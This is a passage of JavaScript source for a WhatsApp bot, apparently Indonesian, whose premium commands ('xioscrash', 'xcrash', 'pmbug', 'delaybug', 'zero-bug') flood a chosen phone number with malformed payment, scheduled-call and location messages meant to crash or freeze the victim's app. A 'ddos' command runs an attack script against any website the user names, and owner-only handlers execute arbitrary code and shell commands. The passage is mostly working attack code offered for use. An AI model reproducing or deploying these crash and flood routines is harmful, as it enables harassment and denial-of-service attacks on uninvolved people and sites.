(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quoted':lep}]}));
await sleep(500)
}
kalz.sendMessage(m.chat, {text:`Jenis Bug : ${command}\nTarget : @${bacot.split('@')[0]}\nStatus : Berhasil\n\nJANGAN LUPA JEDA 5 MENIT !\nBY BOT BUG VIP V2`, mentions: [bacot]})
}
break

case 'xioscrash':
if (!isPrem) return reply('Khusus Pengguna Premium! , Silakan Upgrade Premium Ke +62 895-2811-8070')
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
 victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "50"
for (let i = 0; i < amount; i++) {
kalz.relayMessage(victim,{ 
"paymentInviteMessage": {
serviceType: "UPI",
expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000) 
}},{})
await sleep(3000)
}
reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'xioscrash2':{
if (!isPrem) return reply('Khusus Pengguna Premium! , Silakan Upgrade Premium Ke +62 895-2811-8070')
if (!args[0]) return reply(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
 amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
kalz.relayMessage(m.chat,{ 
"paymentInviteMessage": {
serviceType: "UPI",
expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000) 
}},{})
await sleep(3000)
}
reply(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
}
break
case 'xcrash':{
if (!isPrem) return reply('Khusus Pengguna Premium! , Silakan Upgrade Premium Ke +62 895-2811-8070')
 if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
 victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "100"
for (let i = 0; i < amount; i++) {
kalzdown(pushname,victim)
await sleep(3000)
}
reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
case 'xcrash2':
if (!isPrem) return reply('Khusus Pengguna Premium! , Silakan Upgrade Premium Ke +62 895-2811-8070')
if (!args[0]) return reply(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
 amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
kalzdown(pushname,m.chat)
await sleep(3000)
}
reply(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
break
case 'amountbug': {
if (!isPrem) return reply('Khusus Pengguna Premium! , Silakan Upgrade Premium Ke +62 895-2811-8070')
if (!args[0]) return reply(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${kalz1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
kalz.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
reply(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
break
case 'pmbug' :{
 if (!isPrem) return reply('Khusus Pengguna Premium! , Silakan Upgrade Premium Ke +62 895-2811-8070')
 if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
 await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${kalz1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
kalz.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'delaybug' : {
if (!isPrem) return reply('Khusus Pengguna Premium! , Silakan Upgrade Premium Ke +62 895-2811-8070')
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = kalz2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
kalz.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
reply(`*Successfully Sent Bug To ${victim} Please pause for 3 minutes*`)
break

case 'zero-bug': case 'bug-s': {
if (!q) return kalz(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return kalz(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await kalz('Proses bug 😈...')
for (let j = 0; j < 30; j++) {
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
}
await kalz(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break

case 'ddos': case 'mix':{
                if (!q.includes(' ')) return reply(`Use Methode: .${command} <target> <time>\nExaple: .${command} example.my.id 60`)
                     const targetweb = q.substring(0, q.indexOf(' ') - 0)
                const timeweb = q.substring(q.lastIndexOf(' ') + 1) 
             reply(`*Bot Sedang Attack Tunggu Hasilnya*
• *Target* -> [ ${targetweb} ]
• *Time Attack* -> [ ${timeweb} ]`)
              exec(`node ddos.js ${targetweb} ${timeweb}`, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
        if (error) {
          reply(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          reply(`Error: ${stderr}`);
          return;
        }
        reply(`Success\n\n• Target: ${targetweb},\n• Time: ${timeweb}`);
      });  
                         }
                break

//=================================================//
default:
if (budy.startsWith('=>')) {
if (!isCreator) return false
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return reply(bang)}
try {
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return false
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
await reply(String(err))}}
if (budy.startsWith('$')) {
if(!isCreator) return false
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)})}

if ((budy.match) && ["Assalamualaikum", "assalamualaikum", "Assalamu'alaikum",].includes(budy) && !isCmd) {
reply(`*Waalaikummussalam warahmatullahi wabarokatuh*\n\n\n_📚 Baca yang dibawah ya!_
"Orang yang mengucapkan salam seperti ini maka ia mendapatkan 30 pahala, kemudian, orang yang dihadapan atau mendengarnya membalas dengan kalimat yang sama yaitu “Wa'alaikum salam warahmatullahi wabarakatuh atau ditambah dengan yang lain (waridhwaana). Artinya selain daripada do'a selamat juga meminta pada Allah SWT`)
}
//=================================================//
if (isCmd && budy.toLowerCase() != undefined) {
if (from.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
kalz.copyNForward(from, msgs[budy.toLowerCase()], true)}}
} catch (err) {
m.reply(util.format(err))}}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
